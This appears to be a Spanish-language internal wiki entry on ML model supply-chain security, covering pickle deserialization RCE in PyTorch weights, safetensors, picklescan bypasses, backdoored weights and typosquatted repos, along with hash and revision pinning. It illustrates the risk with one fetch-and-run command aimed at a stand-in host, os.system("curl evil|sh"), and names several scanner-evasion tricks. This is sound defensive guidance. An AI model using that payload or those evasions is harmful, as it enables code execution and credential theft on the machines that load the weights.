# 247 · Model supply chain: pickle, safetensors y pesos envenenados

> El peso que bajas de HuggingFace es **código que vas a ejecutar como root en tu GPU**.
> Un `.ckpt`/`.bin`/`.pt` puede ejecutar comandos arbitrarios al cargarse. Trátalo como un binario no confiable, no como "datos".

## Por qué un peso es peligroso
`torch.load()` por defecto usa **pickle**, un formato que reconstruye objetos Python arbitrarios:
al deserializar ejecuta `__reduce__` → puede correr `os.system("curl evil|sh")` **antes** de que veas un
solo tensor. El ataque no necesita exploit: es el comportamiento documentado de pickle. Modelos LongCat,
SadTalker, RVC, viejos checkpoints de Stable Diffusion (`.ckpt`) vienen en pickle. Cargar uno robado =
RCE en el worker, con acceso a tus tokens HF, a R2/S3 y a la red interna.

## safetensors: el formato que no ejecuta nada
`.safetensors` guarda **solo** tensores + metadatos JSON. No hay opcode de ejecución → cargar es seguro
por diseño. Reglas duras:

| Situación | Acción |
|---|---|
| El repo ofrece `.safetensors` y `.bin` | Usa siempre el `.safetensors`. |
| Solo hay pickle (`.ckpt`/`.pt`/`.pth`/`.bin`) | Convierte tú a safetensors en sandbox aislado, no en prod. |
| Carga en código | `safetensors.torch.load_file()`, nunca `torch.load(weights_only=False)`. |
| Obligado a usar torch.load | `torch.load(path, weights_only=True)` (PyTorch ≥2.6 lo trae por defecto, bloquea pickle de objetos). |

`weights_only=True` **mitiga pero no es bala de plata**: ha tenido bypasses. Convertir a safetensors es lo correcto.

## No confíes en el scanner: picklescan está roto
HuggingFace escanea pickle con **picklescan** y marca "unsafe", pero en 2025 le encontraron 3-4 CVE
(CVSS 9.3): bypass por extensión (renombrar `.pkl`→`.bin` lo confunde), por ZIP con CRC corrupto (salta el
escaneo), y por imports internos de `asyncio` que evaden la blacklist. **Conclusión**: un peso "verde" en
HF puede seguir siendo malicioso. Fija picklescan ≥0.0.31 si lo usas, pero no lo conviertas en tu única defensa.

## Pesos envenenados (más allá del RCE)
Aunque el formato sea seguro (safetensors), el **contenido** puede estar troyanizado:
- **Backdoor en pesos**: el modelo se comporta normal salvo con un trigger (cierto prompt/patrón) → genera
  output atacante. Indetectable por checksum del formato.
- **Typosquatting de repos**: `runwayml/stable-difusion` (sin la `f`), forks con 1 commit y muchos likes falsos.
- **Mitigación**: pin por **revisión** (`revision="<sha-commit>"`, no `main`), descarga del repo **oficial**
  verificado, y registra el hash de lo que realmente bajaste.

## Verificar integridad: checksum + pin de revisión
1. `huggingface-cli download repo --revision <sha>` → nunca un tag móvil.
2. Calcula `sha256` de cada peso y guárdalo en tu repo (`weights.lock`). En CI, refuta si cambia.
3. En el `Dockerfile`/handler, valida el hash **antes** de cargar a VRAM. Falla cerrado.
4. Si pre-popularizas un Network Volume ([[113-network-volume-modelos-grandes]]), hashea **ahí** una vez;
   los workers solo leen → no re-verifican cada cold start, pero el volumen sí está validado.

## Reglas de oro
- Pesos no confiables se convierten/escanean en **contenedor aislado, sin egress, sin tokens** ([[248-container-gpu-isolation]]).
- Trata `pip install` de repos del modelo igual: `requirements.txt` del repo puede traer paquetes maliciosos (cadena de suministro completa).
- Un peso = artefacto firmado y versionado en tu pipeline, no algo que `wget` en runtime.

Cruza con [[163-gestion-pesos-modelos-hf-hub]] y [[28-seguridad-ia-agentes-llm]].
